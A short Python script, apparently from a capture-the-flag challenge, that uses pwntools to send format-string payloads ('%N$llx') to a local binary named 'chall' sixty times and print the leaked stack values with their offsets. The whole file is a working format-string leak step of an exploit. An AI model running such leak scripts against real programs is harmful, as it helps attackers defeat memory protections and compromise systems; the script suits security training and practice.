import sys
import pwn

elf = pwn.context.binary = pwn.ELF('./chall')

addresses = ["0","0"]
for x in range(60):
    io = elf.process()
    io.recv(10000)
    payload = "%"+str(x)+"$llx"
    print(payload)
    io.sendline(payload)
    addresses.append(io.recv(1000).decode("utf-8"))
    io.kill()
i = -2
for addresses in addresses:
    print(str(i)+ ":" + addresses)
    i+=1
